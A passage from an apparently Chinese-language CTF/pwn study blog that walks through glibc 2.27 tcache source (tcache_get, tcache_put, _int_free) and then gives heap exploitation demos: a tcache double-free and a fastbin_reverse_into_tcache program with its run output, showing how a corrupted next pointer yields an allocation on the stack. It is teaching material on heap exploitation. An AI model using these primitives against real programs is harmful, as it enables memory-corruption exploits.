class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_init()</code> 成功返回后，<code>tcache_perthread_struct</code> 就被成功建立了。</p>
<h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><p>接下来将进入申请内存的步骤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>看一下 <code>tcache_get()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h4><p>看完申请，再看看有 tcache 时的释放</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h4><p>跟进 <code>_int_free()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是<strong>要释放的 chunk</strong> 和<strong>该 chunk 对应的 size 在 tcache 中的下标</strong>。</p>
<h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>上面的应该是glibc2.27的源码，来自ctf-wiki</p>
<p>首先，来理解一下新增的两个结构体<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p>
<h4 id="tcache-entry-1"><a href="#tcache-entry-1" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>这里的<code>t</code>是 thread即线程，<code>cache</code> 是缓存，<code>entry</code>是条目，所以顾名思义 tcache_entry 就是线程缓存的条目。</p>
<p>条目是什么意思呢？如下：</p>
<ol>
<li><p><strong>文献和书籍</strong>：在字典、百科全书、参考书籍等中，“条目”指的是对某一特定词汇、概念或主题的解释或描述。例如，字典中的每一个词汇及其定义都可以称为一个条目。</p>
</li>
<li><p><strong>清单和目录</strong>：在清单或目录中，“条目”指的是其中的各个项目或元素，比如商品清单中的每一项商品都可以被称为一个条目。</p>
</li>
<li><p><strong>数据库</strong>：在数据库管理中，一个“条目”指的是数据库中的一条记录，通常包含多个字段的信息。</p>
</li>
</ol>
<p>总之，“条目”强调的是在某个系统或结构中被标识和记录的一个单位，通常与其他条目一起形成一个完整的集合。</p>
<hr>
<p><img data-src="/../images/image-20250320214550152.png" alt="image-20250320214550152"></p>
<p>这个tcache_entry就应该是像上面这样的单链表结构，</p>
<h4 id="tcache-perthread-struct-1"><a href="#tcache-perthread-struct-1" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>这个的意思就是 每个线程的线程缓存的结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个线程都有一个这样的结构体，它包含了每个线程的缓存（因此称为“tcache_perthread_struct”）。</p>
<p>Glibc在2.26中加入了tcache，它对每个线程增加一个bin缓存，这样能显著提高性能，默认情况下，<strong>每个线程有64个bins，以16(8)递增，msize从24(12)到1032(516)</strong>。</p>
<ul>
<li><code>char counts[TCACHE_MAX_BINS];</code><ul>
<li><code>counts</code> 数组用于跟踪每个 bins 中已分配块的数量。每个索引对应于一个特定大小的内存块。</li>
</ul>
</li>
<li><code>tcache_entry *entries[TCACHE_MAX_BINS];</code><ul>
<li><code>entries</code> 数组用于存储指向 chunk 的指针。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>TCACHE_MAX_BINS</code> 被定义为 64，表示缓存可以有最多 64 个bins。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__thread</code> 关键字用于声明 <code>tcache</code> 为线程局部存储变量，这意味着每个线程都有自己独立的 <code>tcache</code> 实例。</li>
<li><code>tcache</code> 初始化为 <code>NULL</code>，表示还没有为其分配内存或没有初始化。</li>
</ul>
<h4 id="tcache-init-1"><a href="#tcache-init-1" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>在这个函数中注意到这两行代码<code>const size_t bytes = sizeof (tcache_perthread_struct); victim = _int_malloc (ar_ptr, bytes);</code></p>
<p>在第一次调用 malloc() 时，系统分配 heap 区域后分配了一个大小为<code>sizeof(tcache_perthread_struct) = 0x241(583)</code>的chunk，它就是每个线程中用于 tcache 机制的一块内存空间。</p>
<h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>在<code>__libc_malloc()</code>开头被调用，这个就是用于从 tcache 中获取一个被 free 的 chunk。</p>
<h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><p>在<code>_int_free()</code>中被调用，这个用于将一个内存块放回tcache中。</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><h5 id="什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？"><a href="#什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？" class="headerlink" title="什么情况下会调用 tcache_get 函数数值（什么情况下会到 tcache 中查找 chunk）？"></a>什么情况下会调用 <code>tcache_get</code> 函数数值（什么情况下会到 tcache 中查找 chunk）？</h5><ol>
<li>在调用 <code>malloc_hook</code> 之前，<code>int_malloc</code> 之前，如果 <code>tcache</code> 中有合适的 chunk，那么就从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code>，若 <code>tcache bin</code> 有对应大小的 chunk，从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code> 时，如果大小不匹配，<code>chunk</code> 会被放入对应的 <code>bins</code>，若达到 <code>tcache_unsorted_limit</code> 限制之前已经存入 <code>chunk</code> 就此被取出（默认限制）。</li>
</ol>
<p>在内存分配的 <code>malloc</code> 函数中，会将内存块移入 <code>tcache</code> 中。</p>
<h5 id="tcache-的功能"><a href="#tcache-的功能" class="headerlink" title="tcache 的功能"></a>tcache 的功能</h5><ol>
<li>首先，申请的内存块符合 <code>fastbin</code> 大小并且在 <code>fastbin</code> 内找到可用的空闲块时，会把 <code>fastbin</code> 链表的其他内存块放入 <code>tcache</code> 中。</li>
<li>其次，申请的内存块符合 <code>smallbin</code> 大小并且在 <code>smallbin</code> 内找到可用的空闲块时，会把 <code>smallbin</code> 链上的其他内存块放入 <code>tcache</code> 中。</li>
<li>第三，针对 <code>unsorted bin</code> 链上有合适的链块时，并不直接返回，而是先放到 <code>tcache</code> 中，继续处理。上面的情况将 <code>chunk</code> 放入 <code>tcache</code> 中，在将合适的 <code>chunk</code> 返回时利用。</li>
</ol>
<p>在 <code>tcache_get</code> 中，<strong>仅仅检查了 <code>tck_idx</code></strong>，前面说过，可以将 <code>tcache</code> 当作一个类似于 <code>fastbin</code> 的单独链表，只是它的 <code>check</code> 并没有复用，因此我们可以利用这一点来进行 <code>attack</code>。</p>
<p> <strong>tcache 遵循“后进先出”，从头部插入，尾部取出</strong></p>
<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>通过下面这段程序再来理解一下tcache，环境：ubuntu 18.04</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o struct struct.c -g</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li>运行到 malloc(0) 直接一直 si 中间的call注意一下 n 跳过。</li>
<li>一直到如下所示 si 进入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78b66 &lt;malloc_hook_ini+374&gt;    call   tcache_init.part                &lt;tcache_init.part&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在一直si到</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78460 &lt;tcache_init.part+80&gt;     call   _int_malloc                &lt;_int_malloc&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>用 n 到下一步，再用 heap 就可以看到系统分配了 heap 和这个 tcache_perthread_struct 的 chunk。</li>
</ul>
<img data-src="../images/image-20250320221542108.png" alt="image-20250320221542108" style="zoom: 50%;" />

<h3 id="glibc-tcache变化"><a href="#glibc-tcache变化" class="headerlink" title="glibc_tcache变化"></a>glibc_tcache变化</h3><ul>
<li>glibc2.26中引入tcache</li>
<li>glibc2.27中正式应用了tcache</li>
<li>glibc2.29中加入了检查tcache的double_free的机制，tcache_get()中加入了key变量</li>
</ul>
<h2 id="攻击原理demo"><a href="#攻击原理demo" class="headerlink" title="攻击原理demo"></a>攻击原理demo</h2><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>本demo是一个简单的利用tcache的double-free attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以</p>
<p>这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了</p>
<p>然后我们再malloc两次就可以得到同一块内存的chunk</p>
<p>对本程序而言，程序先malloc了一个chunk a(size&#x3D;8)</p>
<p>然后连续Free两次chunk a,此时在free list中就会链入两次chunk a</p>
<p>这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了</p>
<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><p>条件：堆溢出 或 UAF</p>
<p>效果：任意地址分配改写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>; <span class="comment">// 定义分配大小为64字节</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;本攻击效果类似于unsorted_bin_attack，但适用于小内存分配（allocsize &lt;= 0x78）。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;目标是构造特定条件使得调用malloc(allocsize)时会将一个超大无符号值写入栈。\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配14个指针用于后续释放</span></span><br><span class="line">    <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;首先我们需要至少free释放7次来填满tcache。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;（超过7次也可以正常工作）\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填满tcache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;接下来要释放的指针是我们要篡改的chunk：%p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;现在或稍后篡改都可以。因为tcache已满，它会被放入fastbin。\n\n&quot;</span>,</span><br><span class="line">        victim</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;接下来需要再释放1到6个指针。这些也会进入fastbin。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;如果我们要覆盖的栈地址值不是零，则需要精确释放6次，否则会导致段错误。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;但如果栈上的值是零，则只需要释放1次。\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填满fastbin</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在栈上创建数组并填充垃圾数据</span></span><br><span class="line">    <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var)); <span class="comment">// 填充数据为0xcd</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;我们想要攻击的栈地址：%p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;当前值为：%p\n&quot;</span>,</span><br><span class="line">        &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">        (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;现在我们利用缓冲区溢出或use-after-free等漏洞\n&quot;</span></span><br><span class="line">        <span class="string">&quot;来覆盖位于%p处的next指针\n\n&quot;</span>,</span><br><span class="line">        victim</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------漏洞利用部分-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 覆盖victim中的链表指针</span></span><br><span class="line">    *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;下一步通过7次malloc(allocsize)清空tcache\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空tcache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在打印栈数组内容以展示尚未被修改的状态：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;下一次内存分配将触发栈数据覆盖。tcache已空，但fastbin还有内容，\n&quot;</span></span><br><span class="line">        <span class="string">&quot;因此下一个分配来自fastbin。同时会用fastbin中的7个chunk重新填充tcache。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;这7个chunk会以逆序复制到tcache，因此目标栈地址最终会成为tcache中的第一个chunk。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;它包含指向链表中下一个chunk的指针，这就是为什么堆指针会被写入栈。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;先前提到如果栈上值为零，释放少于6次也可以工作，\n&quot;</span></span><br><span class="line">        <span class="string">&quot;因为栈上的值会被视为链表next指针，若非有效指针或null会导致崩溃。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;现在栈数组的内容如下：\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(allocsize); <span class="comment">// 触发栈数据覆盖</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize); <span class="comment">// 再次分配内存</span></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;最后，再次调用malloc会得到栈地址：%p\n&quot;</span>,</span><br><span class="line">        q</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]); <span class="comment">// Assert 断言</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ubuntu20.04 , gcc -o fastbin_reverse_into_tcache fastbin_reverse_into_tcache.c  -g</p>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@d2ad36c17601:~/pwn$ ./fastbin_reverse_into_tcache</span><br><span class="line"></span><br><span class="line">本攻击效果类似于unsorted_bin_attack，但适用于小内存分配（allocsize &lt;= 0x78）。</span><br><span class="line">目标是构造特定条件使得调用malloc(allocsize)时会将一个超大无符号值写入栈。</span><br><span class="line"></span><br><span class="line">首先我们需要至少free释放7次来填满tcache。</span><br><span class="line">（超过7次也可以正常工作）</span><br><span class="line"></span><br><span class="line">接下来要释放的指针是我们要篡改的chunk：0x56131b5de4d0</span><br><span class="line">现在或稍后篡改都可以。因为tcache已满，它会被放入fastbin。</span><br><span class="line"></span><br><span class="line">接下来需要再释放1到6个指针。这些也会进入fastbin。</span><br><span class="line">如果我们要覆盖的栈地址值不是零，则需要精确释放6次，否则会导致段错误。</span><br><span class="line">但如果栈上的值是零，则只需要释放1次。</span><br><span class="line"></span><br><span class="line">我们想要攻击的栈地址：0x7ffff3b70d20</span><br><span class="line">当前值为：0xcdcdcdcdcdcdcdcd</span><br><span class="line">现在我们利用缓冲区溢出或use-after-free等漏洞</span><br><span class="line">来覆盖位于0x56131b5de4d0处的next指针</span><br><span class="line"></span><br><span class="line">下一步通过7次malloc(allocsize)清空tcache</span><br><span class="line"></span><br><span class="line">现在打印栈数组内容以展示尚未被修改的状态：</span><br><span class="line"></span><br><span class="line">0x7ffff3b70d10: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d18: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d20: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d28: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d30: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d38: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">下一次内存分配将触发栈数据覆盖。tcache已空，但fastbin还有内容，</span><br><span class="line">因此下一个分配来自fastbin。同时会用fastbin中的7个chunk重新填充tcache。</span><br><span class="line">这7个chunk会以逆序复制到tcache，因此目标栈地址最终会成为tcache中的第一个chunk。</span><br><span 